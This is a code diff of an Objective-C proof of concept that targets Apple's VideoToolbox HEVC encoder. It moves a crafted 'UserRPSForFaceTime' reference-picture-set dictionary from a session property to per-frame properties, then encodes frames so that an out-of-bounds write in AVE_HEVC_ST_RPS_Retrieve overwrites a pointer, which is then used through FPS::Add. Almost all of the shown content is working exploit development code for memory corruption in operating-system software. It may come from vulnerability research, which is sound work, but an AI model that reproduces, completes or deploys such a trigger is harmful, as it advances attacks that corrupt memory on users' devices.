@@ -90,31 +90,48 @@
         @"DeltaPOCS1Minus1": @[@0],
     };
 
-    // Try multiple property formats
-    NSArray *propNames = @[@"UserRPSForFaceTime", @"UserRPS", @"RPS"];
-    NSArray *propValues = @[rpsDict, @[rpsDict], deltaArray];
-    for (int p = 0; p < (int)propNames.count; p++) {
-        status = VTSessionSetProperty(session,
-            (__bridge CFStringRef)propNames[p],
-            (__bridge CFPropertyListRef)propValues[p]);
-        [report appendFormat:@"SetProperty %@: %d\n", propNames[p], (int)status];
-        if (status == 0) break;
+    // UserRPSForFaceTime is a FRAME PROPERTY, not session property
+    // Pass it during encode via frameProperties
+    [report appendString:@"\n--- Phase 2b: encode with UserRPSForFaceTime ---\n"];
+
+    // Create pixel buffer
+    CVPixelBufferRef pb = NULL;
+    CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
+                         kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
+                         NULL, &pb);
+    if (pb) {
+        CVPixelBufferLockBaseAddress(pb, 0);
+        memset(CVPixelBufferGetBaseAddress(pb), 0x80, CVPixelBufferGetDataSize(pb));
+        CVPixelBufferUnlockBaseAddress(pb, 0);
+
+        // Frame properties with UserRPSForFaceTime
+        NSDictionary *frameProps = @{
+            @"UserRPSForFaceTime": rpsDict,
+        };
+
+        VTEncodeInfoFlags flags = 0;
+        CMTime pts = CMTimeMake(0, 30);
+        CMTime dur = CMTimeMake(1, 30);
+
+        status = VTCompressionSessionEncodeFrame(
+            session, pb, pts, dur,
+            (__bridge CFDictionaryRef)frameProps,
+            NULL,  // sourceFrameRefcon
+            &flags  // infoFlagsOut
+        );
+        [report appendFormat:@"encode with RPS: %d (flags=0x%x)\n", (int)status, flags];
+
+        // Encode second frame (triggers FPS::Add through overwritten pointer)
+        pts = CMTimeMake(1, 30);
+        status = VTCompressionSessionEncodeFrame(
+            session, pb, pts, dur,
+            (__bridge CFDictionaryRef)frameProps,
+            NULL, &flags
+        );
+        [report appendFormat:@"encode[1]: %d\n", (int)status];
+
+        CVPixelBufferRelease(pb);
     }
-
-    // Phase 3: trigger OOB (property setting triggers AVE_HEVC_ST_RPS_Retrieve)
-    [report appendString:@"\n--- Phase 3: trigger OOB ---\n"];
-    [report appendString:@"OOB copy happens in AVE_HEVC_ST_RPS_Retrieve at property set.\n"];
-    [report appendString:@"FPS* overwrite occurs here. Encode would use it.\n"];
-
-    // Complete session (flushes any pending work)
-    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
-    [report appendFormat:@"CompleteFrames: %d\n", (int)status];
-
-    // Verdict
-    [report appendString:@"\n"];
-    [report appendString:@"VERDICT: H9_OOB_TRIGGERED\n"];
-    [report appendString:@"If no panic: OOB write landed in encoder session.\n"];
-    [report appendString:@"If panic: OOB corrupted critical pointer.\n"];
     return report;
 }
 
